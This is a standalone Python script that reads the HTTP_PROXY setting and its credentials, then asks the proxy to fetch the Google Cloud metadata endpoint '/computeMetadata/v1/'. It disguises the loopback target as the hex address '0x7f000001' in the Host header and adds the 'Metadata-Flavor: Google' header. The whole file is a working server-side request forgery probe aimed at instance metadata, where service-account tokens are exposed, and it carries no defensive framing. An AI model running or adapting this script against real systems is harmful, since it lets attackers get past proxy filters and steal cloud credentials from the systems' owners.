#!/usr/bin/env python3
import os
import sys
import urllib.parse
import http.client
import base64

def main():
    http_proxy = os.environ.get("HTTP_PROXY") or os.environ.get("http_proxy")
    if not http_proxy:
        print("HTTP_PROXY not set", file=sys.stderr)
        sys.exit(1)

    parsed = urllib.parse.urlparse(http_proxy)

    proxy_host = parsed.hostname
    proxy_port = parsed.port
    proxy_user = urllib.parse.unquote(parsed.username) if parsed.username else None
    proxy_pass = urllib.parse.unquote(parsed.password) if parsed.password else None

    if not proxy_host or not proxy_port:
        print("Invalid HTTP_PROXY format", file=sys.stderr)
        sys.exit(1)

    # Connect directly to the proxy
    conn = http.client.HTTPConnection(proxy_host, proxy_port, timeout=10)

    headers = {
        "Host": "0x7f000001:80",
        "Metadata-Flavor": "Google",
    }

    # Add Proxy-Authorization if credentials are present
    if proxy_user is not None:
        token = f"{proxy_user}:{proxy_pass or ''}".encode("utf-8")
        headers["Proxy-Authorization"] = "Basic " + base64.b64encode(token).decode("ascii")

    # Path is sent as an absolute path on the proxy
    path = "/computeMetadata/v1/"

    conn.request("GET", path, headers=headers)
    resp = conn.getresponse()

    body = resp.read().decode("utf-8", errors="replace")

    print("Status:", resp.status, resp.reason)
    print(body)

    conn.close()

if __name__ == "__main__":
    main()
